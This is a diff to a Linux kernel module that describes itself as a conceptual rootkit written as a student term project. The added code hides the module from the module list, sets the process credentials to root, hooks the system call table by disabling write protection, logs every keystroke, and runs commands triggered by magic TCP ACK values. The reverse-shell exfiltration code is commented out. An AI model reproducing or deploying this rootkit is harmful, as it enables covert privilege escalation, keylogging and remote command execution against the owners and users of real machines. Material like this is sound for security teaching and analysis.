@@ -13,21 +13,25 @@
  *   + Kevin Hoganson
  *   + Alexander Slonim
 **/
-#include <linux/module.h>
-#include <linux/kernel.h>
+#include <linux/module.h>               /* Generic module functions.         */
+#include <linux/kernel.h>               /* Generic kernel functions.         */
 #include <linux/kmod.h>                 /* Used for userspace program calls. */
-#include <linux/slab.h>
+#include <linux/slab.h>                 /* Used for kmalloc().               */
 
-#include <asm/uaccess.h>
-#include <asm/segment.h>
+#include <asm/uaccess.h>                /* Used for definition of KERNEL_DS.   */
+#include <asm/segment.h>				/* Provides us access to segment regs. */
 #include <asm/paravirt.h>               /* Make use of Read_cr0 and Write_cr0. */
 
+// Credit to 'ankan' from www.linuxforums.org/forum/kernel55923-kernel-sockets.html
+// SERVER FUNCTIONS DISABLED.
+// CURRENTLY NOT USED.
 #include <linux/netdevice.h>
 #include <linux/socket.h>
 #include <linux/tcp.h>
 #include <linux/net.h>
 #include <linux/ip.h>
 #include <linux/in.h>
+// CURRENTLY NOT USED.
 
 #include <linux/keyboard.h>				/* Used for keyboard_notifier.		*/
 #include <linux/syscalls.h>				/* Used for syst calls (kern/usr).  */
@@ -40,8 +44,7 @@ MODULE_AUTHOR("Alex Slonim    - a.slonim412@gmail.com");
 MODULE_DESCRIPTION("A conceptual rootkit. Term project for Shiva Azadegan's COSC 439.");
 
 
-//#define KEYBOARD_BUFFER_SIZE 10000000	/* Allocate 10MB for keylog buffer. */
-#define KEYBOARD_BUFFER_SIZE 1024
+#define KEYBOARD_BUFFER_SIZE 10000000	/* Allocate 10MB for keylog buffer. */
 
 #define SHIFT_ENABLED  1				/* Shift key is enabled.  */
 #define SHIFT_DISABLED 0				/* Shift key is disabled. */
@@ -49,6 +52,7 @@ MODULE_DESCRIPTION("A conceptual rootkit. Term project for Shiva Azadegan's COSC
 #define CONNECTED      1				/* r-TCP connection established.     */
 #define DISCONNECTED   0				/* r-TCP connection not established. */
 
+// Memory segment context switch
 mm_segment_t old_fs;
 
 
@@ -70,6 +74,7 @@ struct socket      *sock;
 
 /**
  * REVERSE TCP "SHELL" FUNCTIONALITY
+ * SERVER FUNCTIONALITY DISABLED.
 **/
 unsigned long  int server_ip;
 unsigned short int server_port;
@@ -172,6 +177,9 @@ static unsigned long **get_sys_call_table(void)
 }
 
 
+// Note: some of the members of msg may not be available - depends on kernel version.
+// commented out because of socket errors.
+/*
 void send_buffer(struct socket *sock, const char *buffer, size_t length)
 {
 	struct msghdr msg;
@@ -193,7 +201,7 @@ void send_buffer(struct socket *sock, const char *buffer, size_t length)
 		sock_sendmsg(sock, &msg, (size_t)length);
 	set_fs(old_fs);
 }
-
+*/
 
 /**
  * TODO: 
@@ -248,7 +256,7 @@ int notification(struct notifier_block *nblock, unsigned long code, void *_param
 				{
 					if (connection_state)
 					{
-						send_buffer(sock, keyboard_buffer, KEYBOARD_BUFFER_SIZE);
+						//send_buffer(sock, keyboard_buffer, KEYBOARD_BUFFER_SIZE);
 						memset(&keyboard_buffer, 0, KEYBOARD_BUFFER_SIZE);
 						keyboard_index = 0;
 						buffer[keyboard_index++] = c;
@@ -265,15 +273,20 @@ int notification(struct notifier_block *nblock, unsigned long code, void *_param
 	return NOTIFY_OK;
 }
 
-
+// notification() invoked with every keystroke.
 static struct notifier_block nb =
 {
 	.notifier_call = notification
 };
 
 
+/**
+ * Main functionality is commented out because of socket errors.
+ * For the sake of demonstration, first packet will simply switch 'connection_state'.
+**/
 void reverse_connect(void)
 {
+	/*
 	printk("Initializing network socket.\n");
 	if(sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock) < 0)
 	{
@@ -284,6 +297,7 @@ void reverse_connect(void)
 	sock_in.sin_family = AF_INET;
 	sock_in.sin_addr.s_addr = htonl((unsigned long) server_ip);
 	sock_in.sin_port = htons((unsigned short) server_port);
+	
 
 	if (sock->ops->connect(sock, (struct sockaddr*)&sock_in, sizeof(sock_in), 0) < 0)
 		printk("Could not connect.\n");
@@ -292,6 +306,7 @@ void reverse_connect(void)
 		connection_state = CONNECTED;
 		printk("Connected to server.\n");
 	}
+	*/
 }
 
 
@@ -300,7 +315,7 @@ void reverse_connect(void)
 /* Recommended that user gets root privileges first. */
 void handle_command(unsigned long int ack_seq)
 {
-	
+	// argv[0] reserved for user program.	
 	static char *argv[4];
 	static char *envp[4]; 
 	static char *path;
@@ -501,17 +516,23 @@ void handle_command(unsigned long int ack_seq)
 		if (fd != -1)
 		{
 			(*original_fstat)(fd, &stat_buffer);
-			command_buffer = kmalloc((sizeof(char) * stat_buffer.st_size), GFP_KERNEL);
+			command_buffer = kmalloc((sizeof(char) * stat_buffer.st_size), GFP_NOWAIT);
 			(*original_read)(fd, command_buffer, stat_buffer.st_size);
 			(*original_close)(fd);
 		}
 	set_fs(old_fs);
-
-	kfree(path);
-	
 }
 
 
+/**
+ * SERVER FUNCTIONALITY DISABLED. 
+ * reverse_connect() does not establish r-TCP connection.
+ * connection_state is set to CONNECTED in this function.
+ *
+ * TODO:
+ *   - Identify log file that prints "[INTERFACE] entering promicuous mode."
+ *   - Clear that file with every packet received using call_usermodehelper().
+**/
 int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	struct packet_type *ptype, struct net_device *orig_dev)
 {
@@ -519,11 +540,9 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	struct iphdr  *ip_header;
 
 	unsigned long int ack_seq;
-	unsigned long int seq;
 
 	int i;
-	
-	//printk("One packet received.\n");
+
 	ip_header = (struct iphdr *)skb_network_header(skb);
 
 	if (ip_header->protocol == IPPROTO_TCP)
@@ -532,11 +551,10 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 		tcp_header = (struct tcphdr *) ((unsigned int *) ip_header + ip_header->ihl);
 
 		ack_seq = ntohl(tcp_header->ack_seq);
-		seq     = ntohl(tcp_header->seq);
 		printk("ack_seq: %lu\n", ack_seq);
-		printk("seq:     %lu\n", seq);
 		
-		// Up to 20 different commands.
+		// Up to 20+ different commands.
+		// Just add them to acks[]. 
 		for (i = 0; i < 20; i++)
 		{
 			if (ack_seq == acks[i])
@@ -544,7 +562,9 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 				if (!connection_state)
 				{
 					printk("Attempting to connect to TCP server.\n");
-					reverse_connect();
+					//reverse_connect();
+					connection_state = CONNECTED;
+					handle_command(ack_seq);
 				}
 
 				else
@@ -567,7 +587,31 @@ void start_listen(void)
 	dev_add_pack(&net_proto);
 }
 
+// Credit goes to maK_it for this function.
+// Corrected in order to accommodate kernel header file update (add .val).
+// https://github.com/maK-/maK_it-Linux-Rootkit/blob/master/template.c
+void get_root(void)
+{
+	struct cred *credentials;
+	credentials = prepare_creds();
+
+	if (credentials == NULL)
+		return; 
+	credentials->uid.val   = credentials->gid.val   = 0;
+	credentials->euid.val  = credentials->egid.val  = 0;
+	credentials->suid.val  = credentials->sgid.val  = 0;
+	credentials->fsuid.val = credentials->fsgid.val = 0;
+	commit_creds(credentials);
+}
+
+void hide_me(void)
+{
+	list_del_init(&__this_module.list);
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+}
+
 /*
+// Used for initial testing of call_usermodehelper().
 void test(void)
 {
 	static char *argv[4];
@@ -622,12 +666,19 @@ int start(void)
 {
 	printk("Rootkit started.\n");
 
+	printk("Hiding module object.\n");
+	hide_me();
+
+	printk("Obtaining root privileges.\n");
+	get_root();
+
 	if (!(sys_call_table = get_sys_call_table()))
 	{
 		printk("Unable to find system call table.\n");
 		return -1;
 	}
 
+	printk("Writing system calls to function pointers.\n");
 	write_cr0(read_cr0() & (~ 0x10000));
 		original_open  = (void *)sys_call_table[__NR_open];
 		original_close = (void *)sys_call_table[__NR_close];
@@ -639,7 +690,6 @@ int start(void)
 	register_keyboard_notifier(&nb);
 	keyboard_index = 0;
 
-	printk("Starting network-listening thread.\n");
 	start_listen();
 	connection_state = DISCONNECTED;
 
@@ -650,8 +700,8 @@ int start(void)
 	 * Ports:
 	 * 	 - 0x395D is "14685" in host byte order.
 	**/ 
-	server_ip   = 0x7F000001;
-	server_port = 0x395D    ; 
+	//server_ip   = 0x7F000001;
+	//server_port = 0x395D    ; 
 
 	//test(); 
 
